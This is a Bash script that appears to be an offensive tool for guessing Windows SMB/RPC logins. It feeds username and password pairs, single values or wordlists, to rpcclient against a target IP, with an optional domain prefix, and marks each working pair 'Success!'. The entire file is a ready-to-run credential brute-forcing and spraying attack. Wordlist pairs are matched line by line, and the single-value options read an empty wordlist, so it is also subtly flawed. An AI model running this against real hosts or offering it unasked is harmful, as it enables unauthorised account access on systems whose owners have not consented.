#!/bin/bash

# Default values
target_ip=""
username=""
password=""
domain=""
command=""
usernames_wordlist=""
passwords_wordlist=""

# Function to display usage information
usage() {
    echo "Usage: $0 -t <target_ip> [-U <username> | -u <usernames_wordlist>] [-P <password> | -p <passwords_wordlist>] | -d <domain> | -c <rpcclient_command>"
    exit 1
}

# ANSI escape codes for color
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'  # No color

# Parse command line options
while getopts ":t:U:u:P:p:d:c:" opt; do
    case $opt in
        t)
            target_ip="$OPTARG"
            ;;
        U)
            username="$OPTARG"
            ;;
        u)
            usernames_wordlist="$OPTARG"
            ;;
        P)
            password="$OPTARG"
            ;;
        p)
            passwords_wordlist="$OPTARG"
            ;;            
        c)
            command="$OPTARG"
            ;; 
        d)
            domain="$OPTARG"
            ;;       
        \?)
            echo "Invalid option: -$OPTARG"
            usage
            ;;
        :)
            echo "Option -$OPTARG requires an argument."
            usage
            ;;
    esac
done

# Check if the required arguments are provided
if [ -z "$target_ip" ] || ([ -z "$username" ] && [ -z "$usernames_wordlist" ]) || ([ -z "$password" ] && [ -z "$passwords_wordlist" ]); then
    usage
fi

# Function to handle single usernames or wordlists
process_usernames() {
    if [ -n "$username" ]; then
        for _ in $(seq "$(wc -l < "$passwords_wordlist")"); do
            echo "$username"
        done
    elif [ -n "$usernames_wordlist" ]; then
        cat "$usernames_wordlist"
    fi
}

# Function to handle single passwords or wordlists
process_passwords() {
    if [ -n "$password" ]; then
        for _ in $(seq "$(wc -l < "$usernames_wordlist")"); do
            echo "$password"
        done
    elif [ -n "$passwords_wordlist" ]; then
        cat "$passwords_wordlist"
    fi
}

# Run rpcclient with the provided username and password
paste <(process_usernames) <(process_passwords) | while IFS="$(printf '\t')" read -r current_username current_password; do
    # Append domain if -d option is provided
    if [ -n "$domain" ]; then
        current_username="$domain/${current_username}"
    fi
    
    echo -e "Attempting: ${YELLOW}$current_username:$current_password${NC}"
    if rpcclient -U "$current_username%$current_password" -c "$command" "$target_ip"; then
        echo -e "${RED}Success!${NC}"
    else
        echo -e "${GREEN}Unsuccessful.${NC}"
    fi
done

